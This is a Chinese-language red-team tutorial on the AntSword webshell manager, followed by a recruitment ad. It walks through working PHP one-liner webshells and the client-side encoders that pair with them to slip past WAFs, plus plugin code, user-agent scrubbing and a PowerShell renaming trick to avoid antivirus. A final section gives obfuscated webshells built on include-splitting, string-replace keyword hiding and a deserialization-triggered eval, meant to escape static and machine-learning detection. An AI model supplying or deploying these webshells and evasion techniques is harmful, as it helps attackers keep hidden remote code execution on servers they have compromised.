\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzUyMDEyNTkwNA==&mid=2247484709&idx=1&sn=d60b221de56bcca7465e0cebd196def1&chksm=f9ee699ace99e08cc7d5cf1dfe8b3c53f1b57abedccca1b569400641fcf6e7f2ac85a512ffa3&mpshare=1&scene=1&srcid=1014vgqAU1jnnUFbitBTZTel&sharer\_sharetime=1602633313864&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=68e9243f12923845b40efd3366e55a27d2ced43c80b2f1159ee2ddc2451e0a9e972c0272dd10de39bbc4e2c27f7212a66dd0fff0c9962327aa320d83efea95d95f61c9c6c62c07d4bc767eb125d35fff24a8c0b05769660995c4d41003ca466738d126da75f2798212f4be9049a092edaaf2188a57023c5bbe92b9cb883c8443&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AbGBuTnW1jrLwPNr7Xaspj4%3D&pass\_ticket=5iBkjjQtfbEoCMU4%2BnfhOAJi%2FVJ%2BFty3yCm8kFn8GVUk3mWzBKMJBjfoyOfZ%2B5pr&wx\_header=0)

> 小猪 @Pentes7eam

安恒信息安全研究院 发起了一个读者讨论 快一起来讨论吧！ 参与讨论

antsword 代码结构
-------------

### 总体来看分为两部分

1.  loader，包含了 electron 环境相关的一些代码，一般不需要关心
    
2.  source，包含 antsword 界面和逻辑代码
    

### source 下的几个重要目录和文件

*   antData 里面包含缓存数据，编码器解码器，插件源码，所有的 shell 信息
    
*   modules 包含了 antsword 功能逻辑的底层支持代码，包括发送请求，更新等
    
*   source 这里包含了和不同类型脚本相关的代码，包括内置编码器，内置的对应脚本功能代码
    

编码器解码器开发
--------

### 1 编码器开发

#### 1.1 普通 base64 编码器讲解

##### 一句话原理

这里先简单提下一句话原理，一句话就是一段执行接收到的数据的代码。  
客户端传什么过去，服务端就执行什么，也就意味着功能是可以无限扩展的。

##### 典型 php 一句话

```
<?php eval($\_POST\['test'\]);?>
```

我们在 post 体中传一个 “test=php 代码”，目标就会执行。

##### 新建一个编码器

antsword 会自动生成一个 base64 编码器，代码如下

```
'use strict';
/\*
\* @param  {String} pwd   连接密码
\* @param  {Array}  data  编码器处理前的 payload 数组
\* @return {Array}  data  编码器处理后的 payload 数组
\*/
module.exports =(pwd, data, ext={})=>{
// ##########    请在下方编写你自己的代码   ###################
// 以下代码为 PHP Base64 样例
// 生成一个随机变量名
let randomID =\`\_0x${Math.random().toString(16).substr(2)}\`;
// 原有的 payload 在 data\['\_'\]中
// 取出来之后，转为 base64 编码并放入 randomID key 下
  data\[randomID\]=Buffer.from(data\['\_'\]).toString('base64');
// shell 在接收到 payload 后，先处理 pwd 参数下的内容，
  data\[pwd\]=\`eval(base64\_decode($\_POST\[${randomID}\]));\`;
// ##########    请在上方编写你自己的代码   ###################
// 删除 \_ 原有的payload
delete data\['\_'\];
// 返回编码器处理后的 payload 数组
return data;
}
```

##### 几个关键点

前后的代码都是固定的，我们只需要改函数中的代码。

data\[‘\_‘\] 中放的是给目标执行的 php 原始代码，也就是一句话那些常见功能比如文件管理，命令执行对应的 php 代码，这些都内置在 antsword 中。

返回的 data 是一个数组，在操作时，antsword 会把 data 里的每一个 key 和 value 放到 post 里面传输。

假如有如下 data 数组

```
data ={
"a":"123",
"b":"456"
}
```

实际发送的时候，抓包可以看到 post 的数据为 a=123&b=456。

实际上默认编码器的功能就是 data\[pwd\] = data\[‘\_’\]

这里我们可以看到他先生成一个随机数 xxx。然后把原始 php 代码 base64 之后存到 data\[‘xxx’\]  
然后把随机数 xxx 拼接到一小段固定 php 代码里

```
data\[pwd\]=\`eval(base64\_decode($\_POST\[${randomID}\]));\`;
```

这样，发送数据时，post 的代码如下

```
pwd=eval(base64\_decode($\_POST\[xxx\]));&xxx=php原始功能代码
```

当然实际情况中还会进行 url 编码，这些 antsword 会自动处理。  
总而言之，写编码器主要就是操作 data 数组。

#### 1.2 一个多重编码的编码器

上面的默认编码器有一个很明显的特征，即 data\[pwd\] 的内容里有 php 代码。

这是由于一句话服务端是

```
<?php eval($\_POST\['test'\]);?>
```

意味着不管怎么编码，我们发送的数据里必须要有可执行的 php 代码。

这个缺陷可以通过修改一句话服务端来去除。由于 antsword 非常灵活，只要可以保证一句话服务端的解码过程和 antsowrd 的编码过程对应就可以。  
比如使用如下的一句话服务端

```
<?php @eval(str\_rot13(base64\_decode(strrev($\_POST\['heheda'\]))));?>
```

观察可知，服务端接收到字符串后，先反转字符串，再 base64 解码，再 rot13 编码, 据此可以写出编码器如下

```
'use strict';
module.exports =(pwd, data, ext={})=>{
const rot13encode =(s)=>{
return s.replace(/\[a-zA-Z\]/g,function(c){
returnString.fromCharCode((c <="Z"?
90:
122)>=(c = c.charCodeAt(0)+13)?
        c :
        c -26);
});
}
// 字符串反转 reverseString("abc") == "cba"
const reverseString =(s)=>{
return s.split('').reverse().join('');
}
  data\[pwd\]= reverseString(Buffer.from(rot13encode(data\['\_'\])).toString('base64'));
delete data\['\_'\];
return data;
}
```

这里简单解释下，定义了两个函数，分别是 rot13 编码和字符串反转。  
然后就是把原始 php 代码 rot13 编码，再 base64 编码，最后反转整个字符串。

antsword 有一些别人开发好的编码器，可以根据需要修改，链接如下：  
https://github.com/AntSwordProject/AwesomeEncoder

就实际效果而言，两层编码就没有 waf 会拦截流量了。像 rsa 之类的没有太大必要。

### 2 解码器开发

编码器是对发送的数据进行变形，解码器则是对一句话服务端执行完后返回的数据变形。一般用不到。这里讲一下用法并解释一下默认解码器的写法。

解码器不需要修改一句话服务端。

默认生成的 base64 解码器代码如下

```
'use strict';
module.exports ={
/\*\*
   \* @returns {string} asenc 将返回数据base64编码
   \* 自定义输出函数名称必须为 asenc
   \* 该函数使用的语法需要和shell保持一致
   \*/
  asoutput:()=>{
return\`function asenc($out){
      return @base64\_encode($out);
    }
    \`.replace(/\\n\\s+/g,'');
},
/\*\*
   \* 解码 Buffer
   \* @param {string} data 要被解码的 Buffer
   \* @returns {string} 解码后的 Buffer
   \*/
  decode\_buff:(data, ext={})=>{
returnBuffer.from(data.toString(),'base64');
}
}
```

这里解释下。每次 antsword 执行一个功能时会发送对应脚本的代码过去执行，里面每次都会带有一个叫 asenc 的函数，这个函数默认是直接返回参数的。我们在解码器中直接修改 asenc 这个函数即可处理一句话服务端的返回数据。同时对应在最下面的 decode\_buff 做反向处理即可。

### 3 对功能参数做编码处理

在 antsword 中，在使用各种功能时还会多传一些参数用来放功能所需的数据，这些参数只会进行 base64 编码，某些情况下会被 waf 识别。

对于这种情况，可以在发送前对所有请求体变形一次。在一句话服务端，执行前先变形复原。  
一句话服务端如下

```
<?php
foreach($\_POST as $k => $v){$\_POST\[$k\]=pack("H\*", $v);}
@eval($\_POST\['ant'\]);
?>
```

编码器如下

```
'use strict';
module.exports =(pwd, data)=>{
let ret ={};
for(let \_ in data){
    ret\[\_\]=Buffer.from(data\[\_\]).toString('hex');
}
  ret\[pwd\]= ret\['\_'\];
delete ret\['\_'\];
return ret;
}
```

这里编码器就是先把 data 中所有值全部 hex。一句话服务端先变形回来再执行。

### 4 变换传参的位置

看完前面的部分可以看出，不管我们怎么设置编码器，传参的位置始终是 post 请求体。像以前出现过的一些一句话客户端，比如 altman 之类的还可以配置通过 cookie 来传参。  
antsword 也是可以实现的。

编辑 shell，请求信息里面。可以自定义请求头，参考最前面讲 base64 编码器的部分。手动把`eval(base64_decode($_POST[${randomID}]));`; 这一串代码编码，放到 cookie 里面去。  
然后修改一句话服务端从 cookie 里获取数据。

这种方法对于 asp 等环境的 waf，绕过的效果非常好。

插件开发
----

### 1 插件设计理念

antsword 插件只会和 Shell 进行通信、交互。  
框架内部执行插件的步骤如下  
1 选中 shell，执行插件  
2 框架实例化插件，把 shell 的信息作为参数传给插件对象  
3 插件根据参数生成脚本语言代码传递给一句话服务端执行

### 2 目录结构

通过插件市场安装的插件都在 antdata/plugins / 下，一个插件一个目录。  
如果要编写自己的插件需要在 “插件市场，设置中心” 开启开发者模式，并选中插件目录，一般设置为 antdata/plugins-dev 。这样 antsword 启动时会去指定目录搜索本地插件进行加载。  
注意插件目录名不要重复，这样只会显示后加载的插件。

插件目录结构如下  
README.md // 插件使用说明  
package.json // 插件基础信息文件 (必需)  
index.js // 插件入口文件，文件名由 package.json 指定

### 3 package.json

实际编写时把其他插件的 json 文件复制过来即可。主要需要关注如下几个参数  
name 插件显示的名字  
main 入口的 js 文件  
category 插件的分类，不设置就在默认插件里面  
multiple 是否支持同时对多个 shell 调用  
scripts 支持的脚本语言类型

### 4 入口 js 文件

入口 js 文件需要按照如下格式编写

```
classPlugin{// 插件类
  constructor(opt){// 构造函数
// 这里是插件代码
// ...
     console.log(opt);
}
}
module.exports =Plugin;
```

如果该插件的 multiple 为 false, 则 opt 为一个当前选中的 Shell 对象，如果为 true 则 opt 的值为选中的 Shell 对象列表。opt 包含了 shell 的相关信息。

#### 4.1 opt 的详细结构

opt 包含了 shell 的相关信息，这里给出 opt 的详细结构，方便写插件时参考

```
{
"category":"default",// Shell 分类
"url":"http://127.0.0.1:32769/ant.php",// Shell 的 URL 地址
"pwd":"ant",// Shell 密码
"type":"php",// Shell 类型，取值为 php、asp、aspx、custom
"ip":"127.0.0.1",
"addr":"IANA 保留地址用于本地回送",
"encode":"UTF8",// 字符编码
"encoder":"default",// 编码器
"httpConf":{
"body":{},
"headers":{}
},
"otherConf":{
"command-path":"",
"ignore-https":0,
"request-timeout":"5000",
"terminal-cache":0
},
"ctime":1489506330997,
"utime":1489506351914,
"\_id":"Hm7Zls8KlCJegT39"
}
```

### 5 插件编写示例

#### 5.1 phpinfo 插件

这里先给出代码，然后讲下关键的地方。

```
'use strict';
const tabbar =require('ui/tabbar');
classPlugin{
  constructor(opt){
// 创建UI
let t =new tabbar();
    t.setTitle('myphpinfo()');
    t.showLoading();
// 实例化PHP Shell
let core =new antSword\['core'\]\[opt\['type'\]\](opt);
// 向Shell发起请求
    core.request({
      \_:'phpinfo()'
}).then((\_ret)=>{
      t.safeHTML(\_ret\['text'\]).showLoading(false);
      toastr.success('获取成功！','Success');
}).catch((e)=>{
      toastr.error(JSON.stringify(e),'Error');
      t.close();
});
}
}
module.exports =Plugin;
```

这里先创建了一个 tabbar 标签页用来展示结果, 并设置标题

```
const tabbar =require('ui/tabbar');
let t =new tabbar();
t.setTitle('myphpinfo()');
t.showLoading();
```

然后就是实际发送脚本命令的部分

```
let core =new antSword\['core'\]\[opt\['type'\]\](opt);
// 向Shell发起请求
core.request({
    \_:'phpinfo()'
}).then((\_ret)=>{
    t.safeHTML(\_ret\['text'\]).showLoading(false);
    toastr.success('获取成功！','Success');
}).catch((e)=>{
    toastr.error(JSON.stringify(e),'Error');
    t.close();
});
```

这一段代码里，结构是固定的，只需要关注_和 then，catch 三部分里面的代码_ 里面即是要传递给一句话服务端要执行的代码  
then 是执行成功后本地执行的代码  
catch 是执行出错后本地执行的代码

t.safeHTML() 函数会被参数进行 html 过滤后显示  
toastr 是显示消息

#### 5.2 复制 shell 内容插件

首先想下要让 shell 执行什么内容才能复制 shell 内容。如下代码即可

```
print file\_get\_contents('./'.basename($\_SERVER\['SCRIPT\_NAME'\]));
```

怎么把内容放到剪贴板呢，这里要利用 electron 提供的 api。  
electron 快速入门可以去看 b 站视频，https://www.bilibili.com/video/BV177411s7Lt

```
const clipboard =require('electron').clipboard;
clipboard.writeText(\_ret\['text'\]);
```

下面给出完整代码

```
'use strict';
const clipboard =require('electron').clipboard;
classPlugin{
    construct(opt){
// 实例化 antsword core
let core =new antSword\['core'\]\[opt\['type'\]\](opt);
let payload ="print file\_get\_contents('./'.basename($\_SERVER\['SCRIPT\_NAME'\]));"
// 调用 core.request 函数发送 payload
        core.request({
            \_: payload
}).then((\_ret)=>{
            clipboard.writeText(\_ret\['text'\]);
            toastr.success("复制成功",'Success');
}).catch((e)=>{
            toastr.error(stringify(e),'Error');
});
}
}
```

#### 5.3 检查杀软情况插件

这里就不赘述，简单提一下实现的思路。  
检查杀软，最常见的方法就是列出所有进程，然后和预定义的杀软进程名匹配。  
预定义的杀软可以参考这个项目 https://github.com/r00tSe7en/get\_AV  
根据系统类型执行 tasklist 或者 ps -fe 列出进程，可以用 system 执行。然后写两个循环比较即可。  
由于 electron 是兼容 nodejs 代码的，读取文件直接参考 nodejs 的 api 即可。

自定义 custom 服务端开发
----------------

我们前面提到过，一句话的特点就是所有的脚本功能代码都是由客户端传给一句话服务端执行的。

在流量中就容易出现特征，而且执行复杂的功能时再经过复杂编码，数据包会很大。

这种情况时，可以使用 custom 服务端。他的原理就是把脚本各个功能的实现都放在服务端去，这样，流量中就不会有 eval 等特征。同时因为 antsword 只需要发送命令控制语句，custom 这种方法也能够兼容不同的语言。

custom 脚本的写法可以参考官方的示例，基本就是用脚本语言实现文件管理等功能，链接如下  
https://github.com/AntSwordProject/AwesomeScript

实际使用中，只需要根据需要改关键特征即可。

使用技巧及注意事项
---------

### 1 蚁剑 loader 下不到源码了

这貌似是由于作者自己把源码删了，可以去其他地方下备份的加载器和源码，或者叫已经下载的那把源码拷贝过来。

启动 loader 之后，指向源码路径即可。

以下地址不保证安全性

https://github.com/qinhwen/AntSwordSource  
https://gitee.com/AntSwordProject/antSword

### 2 去除 UA 特征

蚁剑默认 UA 是 antSword/v2.0

打开源码路径（注意不是 loader 目录），找到两个文件

```
modules/request.js
modules/update.js
```

将 antSword/v2.0 替换为正常 UA 即可  
比如

```
Mozilla/5.0(Macintosh;IntelMac OS X 10\_15)AppleWebKit/537.35(KHTML, like Gecko)Chrome/79.0.3925.88Safari/527.36
```

### 3 没设置 disable\_functions 时无法执行系统命令

某些情况下蚁剑会出现 bug，可以浏览文件，但是执行命令就提示 error，disable\_functions 也没做限制。

蚁剑插件市场有个 “脚本执行” 插件。这个时候找到对应语言执行命令的语句，即可执行命令。  
参考下面这个项目找对应语言执行命令的语句即可

https://github.com/adamcaudill/laudanum

### 4 调试方法

使用蚁剑时，出现问题，可以把代理设置成 burp 监听的端口，用 burp 抓蚁剑发送和接收的包，观察问题出在哪里。

由于 antsowrd 是用 electron 写的，也执行 chrome 的开发者工具，不过使用 burp 更直观，编码解码更方便。

### 5 终端内的内置命令

如果终端无法执行系统命令可以参考这些内置命令，一般比较常用的是修改命令解释器

```
asenv \[Key=Value\]设置或显示环境变量, eg: asenv AAA=BBB
ascmd \[file\]指定file来执行命令, eg: ascmd /bin/bash
aslistcmd        列出可使用的命令解释器
aspowershell \[on|off\]启用/关闭PowerShell模式, eg: aspowershell on
aswinmode \[on|off\]强制启用/关闭为Windows模式(针对识别出错的情况), eg: aswinmode on
```

这里重点提下 aspowershell 命令，有些杀软对 powershell 查杀比较严，可以考虑把 powershell 复制到另外到目录并重命名，用 ascmd 指向新路径的 powershell，再执行 aspowershell on 开启 powershell 模式。这样可以绕过部分杀软。

### 6 使用 multipart 发包绕过 waf

很多防火墙和日志都不会记录 file 里的内容。涉及到性能，很多都不开。  
右键 shell，编辑数据，其他设置，勾选上使用 Multipart 发包即可。

### 7 绕过 disable\_functions 和 open\_basedir

php 下，配置 disable\_functions 可以用来限制使用某些敏感函数。open\_basedir 可以限制 php 代码能访问的路径。

在 shell 里如果可以访问文件，但是执行命令提示 ret=127 ，一般就是开启了 disable\_functions。如果访问非 web 路径提示错误，一般就是配置了 open\_basedir。

通过查看 phpinfo 信息也能看到这两项的配置信息。  
antsword 内置了插件，绕过 disable\_functions。已经集成了几种绕过方法，对于常见的情况都能绕过。

### 8 字符编码问题

在 antsword 中直接使用内置编辑器的时候需要特别注意下编码问题。

如果编码错了，直接编辑代码，某些情况下可能会造成程序无法正常运行。打开文件后可以直接在 “用此编码打开” 切换编码。

注意区分这里的字符编码和 antsword 的编码器里面编码的含义。

webshell 免杀
-----------

前面讲的编码器主要是用来混淆流量特征。对于一句话服务端的静态特征绕过一般用如下思路。按照思路举一反三即可

### 1 利用语言特性

静态查杀一般简单的做法是正则匹配，这种的话简单变换即可。更复杂的做法是 hook 底层函数，这种需要利用语言特性自己发挥，以下举两个例子。

#### 2 利用包含和关键字混淆

写入两个文件，一个用来执行代码和包含，一个用来获取 POST 请求.

1.php

```
<?php
include '2.php';
$b ='str\_replace';
$c = $b('1','', $a);
$c($d);
?>
```

2.php

```
<?php $a ='a1s1s1e1r11t';$d = $\_POST\['id'\];?>
```

#### 3 利用反序列化

```
<?php
class A{
var $test ="demo";
function \_\_destruct(){
@eval($this->test);
}
}
$test = $\_GET\['test'\];
$len = strlen($test)+1;
$pp ="O:1:\\"A\\":1:{s:4:\\"test\\";s:".$len.":\\"".$test.";\\";}"; 
$b='ubnbsbbberialize';
$c ='str\_replace';
$d = $c('b','', $b);
$test\_unser = $d($pp); 
?>
```

### 4 白加黑

最近几年出现了使用机器学习等技术检测 webshell 的趋势。对于这种检测方式，可以找一个正常的 php 代码，然后把 webshell 语句拆开，放进去。这样机器学习就很难识别了。

References
----------

[https://mp.weixin.qq.com/s/X2byhuN3TFc6Z3IUCiGafQ](https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483991&idx=1&sn=7f5e52e8d8b7a00f7d2889d8a628ef10&scene=21#wechat_redirect)  
[https://mp.weixin.qq.com/s/EHDvRA3Lpykpu0BDS17ENQ](https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483981&idx=1&sn=d92df5dcbe3fe6a6f07d5f24b754cb58&scene=21#wechat_redirect)  
[https://mp.weixin.qq.com/s/xdvHBWT2VuwYG1Obn7xLIw](https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483698&idx=1&sn=53ca81fffd27fdd13f039781dce8c43d&scene=21#wechat_redirect)  
[https://mp.weixin.qq.com/s/sQVMlkUf\_Z59OqVaRz2rDQ](https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483682&idx=1&sn=135d047b7864a8c1139150b782936f24&scene=21#wechat_redirect)

**关于我们**

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvndnSMyQf6kMHCUBhVal3ssCiav8Kd0rm8FD0WLVjpRzLNBrDEv9u0SrUoSd6Hs0zgaic1Jt8WOfE6tg/640?wx_fmt=png)

**人才招聘**

**一、高级攻防研究员**

**工作地点：**

1\. 杭州 / 重庆 / 上海 / 北京；

**岗位职责：**  
1\. 前沿攻防技术研究；  
2\. 负责完成定向渗透测试任务；  
3\. 负责红队工具的研发。  
**任职要求：**  
1\. 三年以上相关工作经验，若满足以下所有条件，则可忽略此要求；  
2\. 熟练掌握 Cobalt Strike、Empire、Metasploit 等后渗透工具的使用；  
3\. 熟练掌握工作组 / 域环境下的各种渗透思路、手段；  
4\. 具有大型、复杂网络环境的渗透测试经验；  
5\. 具有独立的漏洞挖掘、研究能力；  
6\. 熟练至少一门开发语言，不局限于 C/C++、Java、PHP、Python 等；  
7\. 良好的沟通能力和团队协作能力。  
**加分项：**  
1\. 红队工具开发经验；  
2\. 有良好的技术笔记习惯。

**感兴趣的小伙伴请联系姜女士，或将简历及想要的职位投送至下方邮箱。（请注明来源 “研究院公众号”）**

**联系人：姜女士  
邮箱：double.jiang@dbappsecurity.com.cn  
手机；15167179002，微信同号**